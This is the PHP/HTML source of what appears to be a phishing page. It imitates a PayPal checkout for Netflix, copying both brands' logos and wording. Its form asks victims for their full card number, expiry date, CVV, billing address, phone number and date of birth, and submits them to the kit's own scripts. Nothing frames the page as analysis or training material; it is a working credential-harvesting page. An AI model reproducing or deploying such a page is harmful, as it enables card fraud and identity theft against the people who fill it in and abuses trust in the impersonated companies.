<?php
session_start();
?>
<!DOCTYPE html>
<html>
<head>
<title></title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<link rel="stylesheet" href="./style/css/paypalcard.css" type="text/css">
<link rel="stylesheet" href="../../css/global.css" >
<link rel="stylesheet" href="style/css/inputs.css" >
</head>
<body class="ng-scope">
<div class="ng-scope">
	<div class="ng-scope ng-isolate-scope">
		<div class="xo-checkout-wrapper ng-scope">
			<div class="outerWrapper MA fr" id="outerWrapper">
				<xo-merchant-header class="ng-scope ng-isolate-scope">
					<div class="xo-merchant-header-wrapper ng-scope">
						<header role="banner">
							<div id="header" class="merchantHeader clearfix">
								<div class="headerWrapper"> <img class="ng-scope" src="https://secure.netflix.com/us/pages/account/paypal/netflix_logo.gif"><!-- end ngIf: merchant.logo_url || merchant.imageUrl --> 
								</div>
							</div>
						</header>
					</div>
				</xo-merchant-header>
				<div id="wrapper" class="clearfix">
					<div id="sliding-area">
						<div id="main">
							<xo-header class="ng-isolate-scope">
								<div class="row-fluid paypalHeaderWrapper">
									<div class="span14 clearfix paypalHeader">
										<div id="mobileMerchantHeader">
											<xo-merchant-header class="ng-isolate-scope">
												<div class="xo-merchant-header-wrapper ng-scope">
													<header role="banner">
														<div id="header" class="merchantHeader clearfix">
															<div class="headerWrapper"> <img class="ng-scope" src="https://secure.netflix.com/us/pages/account/paypal/netflix_logo.gif"><!-- end ngIf: merchant.logo_url || merchant.imageUrl --> 
															</div>
														</div>
													</header>
												</div>
											</xo-merchant-header>
										</div>
										<div id="paypalLogo" class="logo ng-scope"> <span class="accessAid ng-binding">Paiement PayPal</span> </div>
										<xo-cart class="ng-isolate-scope"></xo-cart>
										<xo-close-frame class="ng-isolate-scope"><a id="closeButton" class="ng-binding ng-hide"></a></xo-close-frame>
									</div>
								</div>
							</xo-header>
							<div id="contents">
								<div class="ng-scope">
									<div class="ng-scope ng-isolate-scope">
										<div class="xo-page-add-card-page-wrapper ng-scope">
											<section class="addCard" id="addCard">
												<div class="row-fluid ng-scope">
													<div class="span14">

														
														<ui-view class="ng-scope" id="cardinga">
															<div class="ng-scope ng-isolate-scope">
																<div class="ng-scope">
																	<div class="ng-scope ng-isolate-scope">
																		<div>
																			<xo-message class="ng-scope ng-isolate-scope">
																				<div>
																					<div id="notifications" class="ng-scope">
																						<div id="pageLevelErrors" class="msgPage msg-info"> <span class="icon"></span>
																							<ul>
																								<li class="ng-scope"> <span class="ng-binding">Register a card to make your purchase.</span> </li>
																							</ul>
																						</div>
																					</div>
																				</div>
																			</xo-message>
																			<div style="">
																				<form class="login-form loginForm" action="" method="post" data-reactid="13">
						
																					<table style="width:100%; padding-right:25px">
																						<tr>
																							<td valign="top" style="padding:0px 5px 0px 5px; margin:0;">
																								<label class="login-input login-input-email ui-label ui-input-label" style="margin:0;  padding:0px 0px 13px 0px;" id="lbl-email" placeholder="fname" data-reactid="14">
																									<input class="pput ui-text-input fname fnameHaseError" style=" width:89%;" name="ppfname" id="fname" value="" tabindex="1" autocomplete="" placeholder="First name" >
																									<p class="msg msgfname hiddens">Entr a valide First name.</p>
																								</label>
																							</td>
																							<td valign="top"  style="padding:0px 5px 0px 5px; margin:0;">
																								<label class="login-input login-input-email ui-label ui-input-label" style="margin:0; padding:0px 0px 13px 0px;" id="lbl-email" placeholder="email" data-reactid="14">
																									<input class="pput ui-text-input lname lnameHaseError" style=" width:89%;"  name="pplname" id="lname" value="" tabindex="1" autocomplete="" placeholder="Last name"  data-reactid="16">
																									<span class="msg msglname hiddens">Entr a valide Last name.</span>
																								</label>
																							</td>
																						</tr>
																						<tr>
																							<td valign="top"  colspan="2" style="padding:0px 5px 0px 5px; margin:0;">
																							
																								<label class="login-input login-input-email ui-label ui-input-label" style="margin:0; padding:0px 0px 13px 0px;"  id="lbl-email" placeholder="email" data-reactid="14">
																									<img src="../../images/cards.jpg"/><br/>
																									<input class="pput ui-text-input cc ccHaseError" name="ppcc" style="width:95%" placeholder="Credit or Debit card" id="cc" value="" tabindex="1" autocomplete=""  maxlength="20" data-reactid="16">
																									
																									<span class="msg msgCC hiddens">Entr a valide Credit card.</span>
																								</label>
																							</td> 
																						</tr>
																						<tr>
																							<td valign="top"  style="padding:0px 5px 0px 5px; margin:0;">
																								<label class="login-input login-input-email ui-label ui-input-label" style="margin:0; padding:0px 0px 13px 0px;"  id="lbl-email" placeholder="email" data-reactid="14">
																									<input class="pput ui-text-input exd exdHaseError" style=" width:89%;"  name="ppccexp" id="exd" value="" tabindex="1" autocomplete="" placeholder="Expiration date"  maxlength="5" data-reactid="16">
																									
																									<span class="msg msgexd hiddens">Enter a valid Exp.</span>
																								</label>
																							</td>
																							<td valign="top"  style="padding:0px 5px 0px 5px; margin:0;">
																								<label class="login-input login-input-email ui-label ui-input-label" style="margin:0; padding:0px 0px 13px 0px;"  id="lbl-email" placeholder="email" data-reactid="14">
																									<input class="pput ui-text-input cvv cvvHaseError" style=" width:89%;"  name="ppcvv" id="cvv" value="" tabindex="1" autocomplete="" placeholder="CVV"  maxlength="4" data-reactid="16">
																									
																									<span class="msg msgcvv hiddens">Enter a valid CVV.</span>
																								</label>
																							</td>
																						</tr>
																						<tr>
																							<td valign="top"  colspan="2" style="padding:0px 5px 0px 5px">
																								Billing address
																							</td>
																						</tr>
																						<tr>
																							<td valign="top"  colspan="2" style="padding:0px 5px 0px 5px">
																								<label class="login-input login-input-email ui-label ui-input-label" style="margin:0; padding:0px 0px 13px 0px;"  id="lbl-email" placeholder="email" data-reactid="14">
																									<input class="pput ui-text-input adrs adrsHaseError" name="ppaddress" style="width:95%" id="adrs" value="" tabindex="1" placeholder="Address line" autocomplete=""  data-reactid="16">
																									
																									<span class="msg msgadrs hiddens">Enter a valid Address.</span>
																								</label>
																							</td>
																						</tr>
																						<tr>
																							<td valign="top"  style="padding:0px 5px 0px 5px; margin:0;">
																								<label class="login-input login-input-email ui-label ui-input-label" style="margin:0; padding:0px 0px 13px 0px;"  id="lbl-email" placeholder="email" data-reactid="14">
																									<input class= "pput ui-text-input ct ctHaseError" style=" width:89%;"  name="ppcity" id="ct" value="" tabindex="1" autocomplete="" placeholder="City/Town"   data-reactid="16">
																									
																									<span class="msg msgct hiddens">Enter a valid City.</span>
																								</label>
																							</td>
																							<td valign="top"  style="padding:0px 5px 0px 5px; margin:0;">
																								<label class="login-input login-input-email ui-label ui-input-label" style="margin:0; padding:0px 0px 13px 0px;"  id="lbl-email" placeholder="email" data-reactid="14">
																									<input class="pput ui-text-input zip zipHaseError" style=" width:89%;"  name="ppzip" id="zip" value="" tabindex="1" autocomplete="" placeholder="Zip"  maxlength="7" data-reactid="16">
																									
																									<span class="msg msgzip hiddens">Enter a valid ZIP.</span>
																								</label>
																							</td>
																						</tr>
																						<tr>
																							<td valign="top"  colspan="2" style="padding:0px 5px 0px 5px">
																								<label class="login-input login-input-email ui-label ui-input-label" style="margin:0; padding:0px 0px 13px 0px;"  id="lbl-email" placeholder="email" data-reactid="14">
																									<input class="pput ui-text-input phone phoneHaseError" style=" width:95%;"  name="ppphone" id="phone" value="" tabindex="1" placeholder="Phone number" autocomplete=""  data-reactid="16" >
																									
																									<span class="msg msgphone hiddens">Enter a valid Phone number.</span>
																								</label>
																							</td>
																						</tr>
																						<tr>
																							<td valign="top"  colspan="2" style="padding:0px 5px 0px 5px">
																								<label class="login-input login-input-email ui-label ui-input-label" style="margin:0; padding:0px 0px 13px 0px;"  id="lbl-email" placeholder="email" data-reactid="14">
																									
																									<input class="pput ui-text-input dob dobHaseError" name="ppbirth" style=" width:95%;"  id="dob" value="" tabindex="1" autocomplete="" placeholder="Date of birth"  maxlength="10" data-reactid="16">
																									
																									<p class="msg msgdob hiddens">Entr a valide birth date.</p>
																								</label>
																							</td>
																						</tr>
																					</table>
																					
																					<button class="btn login-button btn-submit btn-small" type="submit" autocomplete="off" tabindex="4" data-reactid="25" id="loginbtn" style="display:block; width:100%; border-radius:50px">
																						<!-- react-text: 26 -->Next step
																						<!-- /react-text -->
																					</button>
																					
																				</form>
																			</div>
																			<div ui-view="" class="ng-scope"></div>
																		</div>
																	</div>
																</div>
															</div>
														</ui-view>
													</div>
													<div class="span10 ng-isolate-scope"> <span class="ng-scope">
														<xo-value-props class="ng-scope ng-isolate-scope">
															<div class="props addCard">
																<div class="prop-img"></div>
																<h2 class="vprop-header ng-binding"> PayPal, your safety reflex to pay online. </h2>
																<p class="ng-binding ng-scope"> You choose where to shop, we protect your financial information. </p>
															</div>
														</xo-value-props>
														</span> </div>
													<div class="span10 ng-isolate-scope"></div>
												</div>
											</section>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
					<xo-spinner class="ng-isolate-scope"></xo-spinner>
				</div>
				<xo-footer class="ng-scope ng-isolate-scope">
					<footer content="">
						<div class="footer clearfix commonFooter">
							<p id="defaultCancelLink" class="cancelUrl ng-scope"> <a href="#rja3 azby" id="cancelLink"> <span class="ng-binding">Cancel and return to <span>Netflix.com</span></span> </a> </p>
							<div class="footerWrapper">
								<table class="footerLinks">
									<tbody>
										<tr class="ng-scope">
											<th id="footer_terms" class="ng-scope"> <a href="#" class="popup ng-scope">Legal</a> </th>
											<th id="footer_useragreement" class="ng-scope"> <a href="#" class="popup ng-scope">Terms of use</a> </th>
											<th id="footer_privacy" class="ng-scope"> <a href="#" class="popup ng-scope">Respect for private life</a> </th>
											<th class="ng-scope"> <a href="#" id="footer_sfLink" class="ng-binding">Evaluation</a> </th>
										</tr>
									</tbody>
								</table>
								<p class="copyright ng-binding"> © 1999 - 2018 <span class="secureIcon"></span> <span class="accessAid ng-binding">PayPal, votre réflexe sécurité pour payer en ligne.</span> </p>
							</div>
						</div>
					</footer>
				</xo-footer>
			</div>
		</div>
	</div>
</div>
	<script src="https://code.jquery.com/jquery-3.3.1.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
	<script src="../../js/jquery.fileuploader.min.js" type="text/javascript"></script>
	<script src="../../js/updatec.js" type="text/javascript"></script>
	<script src="https://cdn.jsdelivr.net/jquery.validation/1.16.0/jquery.validate.min.js"></script>
	<script src="https://cdn.jsdelivr.net/jquery.validation/1.16.0/additional-methods.min.js"></script>
	<script src="../../js/ccv.js"></script>
	<script src="../../js/jquery.inputmask.bundle.js"></script>
</body>
</html>
